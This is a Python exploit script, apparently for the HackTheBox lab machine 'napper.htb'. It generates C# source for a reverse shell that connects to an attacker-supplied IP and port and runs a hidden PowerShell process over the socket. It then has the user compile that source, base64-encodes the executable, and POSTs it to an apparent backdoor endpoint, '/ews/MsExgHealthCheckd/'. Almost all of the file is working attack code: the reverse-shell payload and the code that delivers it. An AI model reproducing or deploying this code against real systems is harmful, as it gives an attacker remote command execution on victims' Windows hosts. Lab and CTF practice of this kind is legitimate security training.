import requests
import os
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def payload():

    current_path = os.getcwd()
    file_name = 'Program.cs'
    file_path = current_path + '/' + file_name
    file_payload_encoded_name = 'b64url-encoded.txt'
    file_payload_encoded_path = current_path + '/' + file_payload_encoded_name


    if os.path.isfile(file_path):
        yes_no  = input('Do you want to update your IP and port ? (Y/N): ')
        if str(yes_no).upper() == 'Y':
            ip = input('IP address : ')
            port = input('Port : ')
            payload_c = f'''
    using System;
    using System.Text;
    using System.IO;
    using System.Diagnostics;
    using System.ComponentModel;
    using System.Net;
    using System.Net.Sockets;

    namespace Program
    {{
        public class Run
        {{
            private StreamWriter streamWriter;

            public Run()
            {{
                RunMain();
            }}

            public void RunMain()
            {{
                using (TcpClient client = new TcpClient("{ip}", {port}))
                {{
                    using (Stream stream = client.GetStream())
                    {{
                        using (StreamReader rdr = new StreamReader(stream))
                        {{
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {{
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }}
                        }}
                    }}
                }}
            }}

            private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {{
                StringBuilder strOutput = new StringBuilder();

                if (!String.IsNullOrEmpty(outLine.Data))
                {{
                    try
                    {{
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }}
                    catch (Exception err) {{ }}
                }}
            }}
        }}

        public class AnotherClass
        {{
            public static void Main(string[] args)
            {{
                Run runInstance = new Run();
            }}
        }}
    }}

    '''
            with open(file_path, 'w') as f:
                f.write(payload_c)
            print()
            print('Result : ------------------')
            print(f'File modified at : {file_path}')
            print()
            print(f'Using IP : {ip}')
            print(f'Using port : {port}')
    else:
        ip = input('IP address : ')
        port = input('Port : ')
        payload_c = f'''
    using System;
    using System.Text;
    using System.IO;
    using System.Diagnostics;
    using System.ComponentModel;
    using System.Net;
    using System.Net.Sockets;

    namespace Program
    {{
        public class Run
        {{
            private StreamWriter streamWriter;

            public Run()
            {{
                RunMain();
            }}

            public void RunMain()
            {{
                using (TcpClient client = new TcpClient("{ip}", {port}))
                {{
                    using (Stream stream = client.GetStream())
                    {{
                        using (StreamReader rdr = new StreamReader(stream))
                        {{
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {{
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }}
                        }}
                    }}
                }}
            }}

            private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {{
                StringBuilder strOutput = new StringBuilder();

                if (!String.IsNullOrEmpty(outLine.Data))
                {{
                    try
                    {{
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }}
                    catch (Exception err) {{ }}
                }}
            }}
        }}

        public class AnotherClass
        {{
            public static void Main(string[] args)
            {{
                Run runInstance = new Run();
            }}
        }}
    }}

    '''
        with open(file_path,'w') as nf:
            nf.write(payload_c)
        print('Result : ------------------')
        print(f'File Created at {current_path}')
        print()
        print(f'Using IP : {ip}')
        print(f'Using port : {port}')

    print()
    print(f'Please : Compile the Program.cs using mcs and put it in the same dir as this script : {current_path}')
    print('mcs -out:Program.exe Program.cs')
    print()
    compile_yes_no = input('Is it compiled ? (Y/N) :')

    if compile_yes_no.upper() == 'Y':
        print()
        print('Creating the base64 url encoded payload')

        if os.path.isfile(file_payload_encoded_name):
            os.remove(file_payload_encoded_name)
            open(file_payload_encoded_name,'w')
            os.system(f'base64 -w0 Program.exe > {file_payload_encoded_name}')
            print(f'File created at : {file_payload_encoded_path}')
        else:
            f = open(file_payload_encoded_name,'w')
            os.system(f'base64 -w0 Program.exe > {file_payload_encoded_name}')
            print(f'File created at : {file_payload_encoded_path}')
    return file_payload_encoded_path
    

def sender(file):

    with open(file,'r') as fr :
        payload = fr.read()

    hosts=["napper.htb"]

    form_field=f"sdafwe3rwe23={requests.utils.quote(str(payload))}"

    for h in hosts:
        url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"

    try:
        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
        print()
        print('Sending payload to napper.htb')
        print('Result : ------------------')
        print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass
   

if __name__ == '__main__':
    file = payload()
    sender(file)
